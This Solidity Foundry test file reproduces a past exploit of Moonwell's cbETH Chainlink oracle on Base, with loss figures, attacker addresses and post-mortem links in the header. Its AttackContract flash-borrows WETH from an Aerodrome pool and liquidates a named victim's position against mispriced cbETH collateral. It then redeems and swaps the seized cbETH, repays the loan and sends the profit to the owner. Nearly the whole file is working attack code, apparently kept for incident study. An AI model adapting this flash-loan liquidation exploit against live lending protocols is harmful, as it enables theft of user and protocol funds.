// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import "../basetest.sol";
import "../interface.sol";

  // @KeyInfo - Total Lost : ~1.78M US$ (protocol bad debt)
   /* Bad Debt Summary
  cbETH	467.7555896	$ 1,033,393.71
  WETH	239.6643802	$ 478,998.02
  USDC	232607.2797	$ 232,584.02
  EURC	9719.35397	$ 11,566.03
  cbBTC	0.16685141	$ 11,442.17
  cbXRP	5481.145179	$ 7,947.66
  DAI	1520.178946	$ 1,520.03
  USDS	1053.312414	$ 1,052.15
  AERO	642.4149872	$ 204.87
  MORPHO	126.2302566	$ 171.67
  wstETH	0.06824221	$ 164.49
  Total	-	$ 1,779,044.83
  */
  // Attacker : 0x0100ab3021dE6e00c39BE16424472164c281C308
  // Attack Contract : 0x083CfA7FD187Be983ce5D519fE7ae78357779998
  // Vulnerable Contract : 0xEC942bE8A8114bFD0396A5052c36027f2cA6a9d0 (Moonwell Chainlink Oracle on Base)
  // Attack Tx : 0x2f4ff77c77ce2a52c80fcd59a4cac4b05f4285afe1f3b92118b0a004a325953c
  // @Info
  // @Analysis
  // Post-mortem : https://forum.moonwell.fi/t/mip-x43-cbeth-oracle-incident-summary/2068
  // Recovery Plan : https://forum.moonwell.fi/t/recovery-plan-cbeth-incident-and-moonwell-apollo-onboarding/2084
  // Twitter Guy : https://x.com/pashov/status/2023872510077616223, https://x.com/moo9000/status/2024040101982990534

contract Moonwell_exp is BaseTestWithBalanceLog {
    bytes32 exploitTx=0x2f4ff77c77ce2a52c80fcd59a4cac4b05f4285afe1f3b92118b0a004a325953c;
    
    address mWETH=0x628ff693426583D9a7FB391E54366292F509D457;
    address mcbETH=0x3bf93770f2d4a794c3d9EBEfBAeBAE2a8f09A5E5;
    address cbETH=0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22;
    address weth=0x4200000000000000000000000000000000000006;
    address Aerodrome_Finance_CLPool=0x861A2922bE165a5Bd41b1E482B49216b465e1B5F;
    address Aerodrome_Finance_CLPool_2=0x47cA96Ea59C13F72745928887f84C9F52C3D7348;
    AttackContract attack;

    function setUp() public {
        vm.createSelectFork("base", exploitTx);
        attack = new AttackContract(
            mWETH,
            mcbETH,
            cbETH,
            weth,
            Aerodrome_Finance_CLPool,
            Aerodrome_Finance_CLPool_2
        );
    }

    function testExploit() public balanceLog {
        attack.start();
    }
    receive() external payable{}
}
contract AttackContract{
    address owner;
    IRToken mWETH;
    IRToken mcbETH;
    IERC20 cbETH;
    IERC20 weth;
    ICLPool Aerodrome_Finance_CLPool;
    ICLPool Aerodrome_Finance_CLPool_2;
    address victim;
    constructor(
        address _mWETH,
        address _mcbETh,
        address _cbETH, 
        address _weth, 
        address _Aerodrome_Finance_CLPool, 
        address _Aerodrome_Finance_CLPool_2)
        {
            owner=msg.sender;
            mWETH = IRToken(_mWETH);
            mcbETH = IRToken(_mcbETh);
            cbETH = IERC20(_cbETH);
            weth = IERC20(_weth);
            Aerodrome_Finance_CLPool = ICLPool(_Aerodrome_Finance_CLPool);
            Aerodrome_Finance_CLPool_2 = ICLPool(_Aerodrome_Finance_CLPool_2);
            victim=0x4C1A699166CD60473040d0618C47Ad82251B9D0f;
        }
    
    function start() public{
        require(mWETH.borrowBalanceCurrent(victim) == 2_227_585_181_466_568_852_543, "failed");
        Aerodrome_Finance_CLPool.flash(address(this), 129_906_284_941_311_087, 0, abi.encode(129_906_284_941_311_087));
    }

    function uniswapV3FlashCallback(uint256 amount0Delta, uint256 amount1Delta, bytes calldata data) external {
        uint256 amount = abi.decode(data, (uint256));
        weth.approve(address(mWETH), amount);

        mWETH.liquidateBorrow(victim, amount, address(mcbETH));
        (mcbETH.balanceOf(address(this))==1_207_922_808_230);

        mcbETH.redeem(mcbETH.balanceOf(address(this)));
        Aerodrome_Finance_CLPool_2.swap(
            address(this), 
            true, 
            int256(cbETH.balanceOf(address(this))), 
            4_295_128_740, 
            ""
        );

        require(amount+amount0Delta==129_917_976_506_955_805, "failed");
        weth.transfer(address(Aerodrome_Finance_CLPool), amount + amount0Delta);
        weth.withdraw(weth.balanceOf(address(this)));
        
        (bool success,)=owner.call{value:address(this).balance}("");
        require(success,"failed");
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        require(amount0Delta==242_681_146_382_025_215_739, "failed");
        cbETH.transfer(msg.sender, uint256(amount0Delta));
    }
    receive() external payable{}
}

interface ICLPool{
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external;
}
